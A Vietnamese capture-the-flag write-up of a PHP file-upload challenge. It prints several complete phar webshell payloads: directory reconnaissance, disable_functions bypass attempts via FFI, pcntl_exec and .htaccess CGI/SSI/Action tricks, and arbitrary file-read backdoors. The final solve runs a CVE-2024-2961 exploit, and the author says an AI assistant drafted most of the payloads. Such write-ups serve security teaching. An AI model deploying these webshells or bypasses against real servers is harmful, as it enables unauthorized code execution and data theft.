# ## ba buoc len may revenge

## Challenge Information
- **Category**: Web Exploitation
- **Event**: BKSEC TTV 2026
- **Author**: teebow1e
- **Tags**: #web #CVE-2024-2961
---
## 1. Description
>Liệu 3 bước lần này có lên được mây?
## 2. Overview
Bài này nối tiếp bài `ba buoc len may` nhưng ở mức độ khó hơn vì server filter đi khá nhiều thứ
## 3. Reconnaissance
Cũng như giao diện trước đó với các chức năng tương tự, lần này em bỏ qua bước recon và khai thác thẳng với kịch bản cũ luôn xem được không.

![](images/Pasted%20image%2020260308110219.png)

Cũng vẫn cách khai thác cũ nhưng lần này có vẻ flag đã được giấu đi rất kỹ. Nhưng điều này lại chứng minh được bài này vẫn có thể khai thác bằng các Upload file. Đến đây em nhờ AI thử viết payload để scan xem có những gì bị khóa và có tồn tại file khả nghi nào không. 

![](images/Pasted%20image%2020260308110526.png)

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();

$payload = '<?php 
echo "<div style=\"background:#111; color:#0f0; padding:20px; font-weight:bold;\"><pre>";

echo "=== 1. DANH SÁCH HÀM BỊ KHÓA (DISABLE_FUNCTIONS) ===\n\n";
$disabled = ini_get("disable_functions");
echo $disabled ? $disabled : "[+] Không có hàm nào bị khóa!";

echo "\n\n=== 2. KIỂM TRA THƯ MỤC GỐC (/) VÀ QUYỀN HẠN ===\n\n";
$files = scandir("/");
printf("%-10s | %-10s | %s\n", "Quyền", "Chủ sở hữu", "Tên file");
echo str_repeat("-", 40) . "\n";
foreach($files as $f) {
    if($f === "." || $f === "..") continue;
    $path = "/" . $f;
    $perms = substr(sprintf("%o", fileperms($path)), -4);
    
    // Xử lý lỗi nếu không lấy được thông tin owner
    $owner_info = @posix_getpwuid(@fileowner($path));
    $owner = $owner_info ? $owner_info["name"] : "unknown";
    
    printf("%-10s | %-10s | %s\n", $perms, $owner, $f);
}

echo "\n\n=== 3. TÌM KIẾM ĐỆ QUY FILE \'FLAG\' ===\n\n";
$search_dirs = ["/var/www", "/tmp", "/home"];
foreach($search_dirs as $dir) {
    if(is_dir($dir)) {
        try {
            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
            foreach($iterator as $file) {
                $name = strtolower($file->getFilename());
                if(strpos($name, "flag") !== false) {
                    echo "[?] Khả nghi: " . $file->getPathname() . "\n";
                }
            }
        } catch (Exception $e) {
            // Bỏ qua các thư mục không có quyền đọc
        }
    }
}

echo "</pre></div>";
?>';

$phar->addFromString('test.php', $payload);
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

![](images/Pasted%20image%2020260308110725.png)

Để ý có file `readfile` có mã số khác với các file còn lại, lúc này em hỏi AI luôn:

![](images/Pasted%20image%2020260308110847.png)

-> Dựa vào đây em tìm cách thực thi readflag để lấy flag.
## 4. Exploitation
![](images/Pasted%20image%2020260308110930.png)

AI có gợi ý cho em bypass bằng FFI

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();

$payload = '<?php 
echo "<div style=\"background:#111; color:#0f0; padding:20px; font-weight:bold; font-size:16px;\"><pre>";
echo "=== TIẾN HÀNH RCE VƯỢT TƯỜNG LỬA (BYPASS) ===\n\n";

if (class_exists("FFI")) {
    echo "[+] Phát hiện FFI được bật! Đang tiến hành gọi C library...\n";
    try {
        // Khởi tạo interface gọi hàm system() của C
        $ffi = FFI::cdef("int system(const char *command);");
        
        // Thực thi /readflag và đẩy kết quả vào thư mục /tmp
        echo "[+] Đang chạy lệnh: /readflag > /tmp/flag_out.txt\n";
        $ffi->system("/readflag > /tmp/flag_out.txt");
        
        // Đọc kết quả
        echo "\n[+] KẾT QUẢ TỪ READFLAG:\n";
        echo "----------------------------------------\n";
        echo htmlspecialchars(file_get_contents("/tmp/flag_out.txt"));
        echo "\n----------------------------------------\n";
        
    } catch (Exception $e) {
        echo "[-] Lỗi FFI: " . $e->getMessage();
    }
} else {
    echo "[-] FFI không được bật! Chúng ta sẽ cần rà soát thêm (thử dùng pcntl_exec nếu có).";
}

echo "</pre></div>";
?>';

$phar->addFromString('test.php', $payload);
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

Kết quả:

```
=== TIẾN HÀNH RCE VƯỢT TƯỜNG LỬA (BYPASS) ===
[-] FFI không được bật! Chúng ta sẽ cần rà soát thêm (thử dùng pcntl_exec nếu có).
```

Sau đó em thử bypass bằng `.htaccess`:

![](images/Pasted%20image%2020260308111039.png)

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();

$payload = '<?php 
echo "<div style=\"background:#111; color:#0f0; padding:20px; font-weight:bold; font-size:16px;\"><pre>";
echo "=== TIẾN HÀNH BYPASS TƯỜNG LỬA PHP ===\n\n";

// 1. Thử dùng pcntl_exec (nếu may mắn tác giả quên khóa)
if (function_exists("pcntl_exec")) {
    echo "[+] Phát hiện pcntl_exec khả dụng!\n";
    file_put_contents("/tmp/run_flag.sh", "#!/bin/sh\n/readflag > /tmp/flag_out.txt\nchmod 777 /tmp/flag_out.txt");
    chmod("/tmp/run_flag.sh", 0777);
    @pcntl_exec("/bin/sh", ["/tmp/run_flag.sh"]);
}

// 2. Kỹ thuật "Nhảy dù" qua Apache CGI
echo "=== TRIỂN KHAI KẾ HOẠCH B: APACHE CGI ===\n";
$dir = "/var/www/html/user_submissions/";

// Tạo file .htaccess bật CGI
$htaccess = "Options +ExecCGI\nAddHandler cgi-script .sh";
if (file_put_contents($dir . ".htaccess", $htaccess)) {
    echo "[+] Đã ghi đè .htaccess thành công, CGI đã được bật!\n";
}

// Tạo file shell CGI để chạy /readflag
$cgi_script = "#!/bin/sh\n" .
              "echo \"Content-Type: text/plain\"\n" .
              "echo \"\"\n" .
              "echo \"=== KẾT QUẢ TỪ TRÙM CUỐI (/readflag) ===\"\n" .
              "/readflag\n";
              
if (file_put_contents($dir . "flag.sh", $cgi_script)) {
    chmod($dir . "flag.sh", 0775); // Cấp quyền thực thi
    echo "[+] Đã tạo file CGI Bash tại: " . $dir . "flag.sh\n";
    echo "\n=> VŨ KHÍ ĐÃ SẴN SÀNG! HÃY TRUY CẬP ĐƯỜNG DẪN DƯỚI ĐÂY ĐỂ LẤY CỜ:\n";
    echo "http://" . $_SERVER["HTTP_HOST"] . "/user_submissions/flag.sh\n";
} else {
    echo "[-] Không thể tạo file flag.sh\n";
}

// Đọc thử file output nếu pcntl_exec đã chạy trót lọt
if (file_exists("/tmp/flag_out.txt")) {
    echo "\n\n=== KẾT QUẢ TỪ PCNTL_EXEC ===\n";
    echo htmlspecialchars(file_get_contents("/tmp/flag_out.txt"));
}

echo "</pre></div>";
?>';

$phar->addFromString('test.php', $payload);
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

Kết quả:

![](images/Pasted%20image%2020260308111112.png)

Dường như server trả về nguyên văn bản text. Chưa bỏ cuộc, em lại thử tiếp SSI =))

![](images/Pasted%20image%2020260308111250.png)

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();

$payload = '<?php 
echo "<div style=\"background:#111; color:#0f0; padding:20px; font-weight:bold; font-size:16px;\"><pre>";
echo "=== KẾ HOẠCH C: BYPASS QUA APACHE SSI ===\n\n";

$dir = "/var/www/html/user_submissions/";

// 1. Tạo file .htaccess để kích hoạt tính năng SSI cho đuôi .shtml
$htaccess = "Options +Includes\nAddType text/html .shtml\nAddOutputFilter INCLUDES .shtml";
if (file_put_contents($dir . ".htaccess", $htaccess)) {
    echo "[+] Đã ghi đè .htaccess để bật SSI!\n";
}

// 2. Tạo file .shtml chứa thẻ nhúng lệnh OS
$shtml = "<html><body>\n";
$shtml .= "<h1>KẾT QUẢ TỪ READFLAG (SSI):</h1>\n";
$shtml .= "<pre></pre>\n";
$shtml .= "</body></html>";

if (file_put_contents($dir . "flag.shtml", $shtml)) {
    echo "[+] Đã tạo file flag.shtml thành công!\n";
    echo "\n=> BẤM VÀO LINK NÀY ĐỂ XEM CỜ: \n";
    echo "http://" . $_SERVER["HTTP_HOST"] . "/user_submissions/flag.shtml\n";
} else {
    echo "[-] Lỗi: Không thể ghi file flag.shtml\n";
}

echo "</pre></div>";
?>';

$phar->addFromString('test.php', $payload);
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

Kết quả vẫn không được:

![](images/Pasted%20image%2020260308111319.png)

Thật sự lúc này em rất nản rồi, sau khi uống nước và bình tĩnh thì em có thử lần nữa với Action Directive:

![](images/Pasted%20image%2020260308111452.png)

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();

$payload = '<?php 
echo "<div style=\"background:#111; color:#0f0; padding:20px; font-weight:bold; font-size:16px;\"><pre>";
echo "=== RÀ SOÁT CỬA TỬ (ESCALATION) ===\n\n";

echo "1. KIỂM TRA CRONJOB HỆ THỐNG:\n";
echo "----------------------------------------\n";
echo htmlspecialchars(@file_get_contents("/etc/crontab"));
echo "\n----------------------------------------\n\n";

echo "2. THỬ KÍCH HOẠT APACHE ACTION TRICK:\n";
$dir = "/var/www/html/user_submissions/";

// Dùng .htaccess để ép Apache tự chạy /readflag khi gặp đuôi .suid
$htaccess = "AddHandler readflag-handler .suid\nAction readflag-handler /readflag\n";
if (file_put_contents($dir . ".htaccess", $htaccess)) {
    file_put_contents($dir . "trigger.suid", "Kich hoat flag!");
    echo "[+] Đã thiết lập bẫy Apache Action.\n";
    echo "=> HÃY MỞ TAB MỚI VÀ TRUY CẬP LINK NÀY:\n";
    echo "http://" . $_SERVER["HTTP_HOST"] . "/user_submissions/trigger.suid\n";
} else {
    echo "[-] Lỗi ghi file .htaccess\n";
}

echo "</pre></div>";
?>';

$phar->addFromString('test.php', $payload);
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

Kết quả vẫn là nohope và lần này còn trả về lỗi:

![](images/Pasted%20image%2020260308111524.png)

Sau một hồi xem xét lại những sai lần và tâm sự cũng Gemini thì em đã được bạn khuyên rằng có thể thử CVE-2024-2961 (Lỗ hổng tràn bộ đệm PHP iconv) vì server đang chạy PHP 8.0.12 trên nền Debian và sử dụng thư viện glibc khả năng cao sẽ dính lỗi này.

Em up payload để kéo 2 file `php` và `libc` của server về Kali để dùng tool (vì tool CVE-2024-2961) cần đọc chính xác 2 file này để hoạt động:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();

$payload = '<?php 
if(isset($_GET["dl"])){
    header("Content-Type: application/octet-stream");
    readfile($_GET["dl"]);
    exit;
}
echo "=> Tool Download Sẵn Sàng! Dùng tham số &dl=/path/to/file để tải file.";
?>';

$phar->addFromString('test.php', $payload);
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

Em nhờ AI hướng dẫn cách cài đặt và sử dụng tool luôn:

![](images/Pasted%20image%2020260308112241.png)

![](images/Pasted%20image%2020260308112419.png)

(một số bước nó hướng dẫn sai em sẽ không cap hết)

Payload up lên server để setup cho tool:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();

$payload = '<?php 
// 1. Cửa hậu để cậu đọc flag trên trình duyệt
if (isset($_GET["read"])) {
    echo "<pre>=== TRÙM CUỐI ===\n\n";
    echo htmlspecialchars(file_get_contents($_GET["read"]));
    echo "</pre>";
    exit;
}

// 2. Proxy hứng request từ cnext-exploit.py
if (isset($_POST["file"])) {
    echo "File contents: " . file_get_contents($_POST["file"]);
    exit;
}

echo "=> PROXY ĐÃ SẴN SÀNG! Đợi lệnh từ cnext-exploit.py...";
?>';

$phar->addFromString('test.php', $payload);
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

sau khi fixbug và cài các thư viện liên quan ở Kali thì em chạy lệnh:

```bash
python3 cnext-exploit.py "http://100.64.0.66:36363/index.php?page=phar://user_submissions/shell.jpg/test.php" "/readflag > /tmp/cve_flag.txt"
```

Và ra flag:

![](file:///C:/Users/Admin/Pictures/Screenshots/Screenshot%202026-03-07%20140618.png)
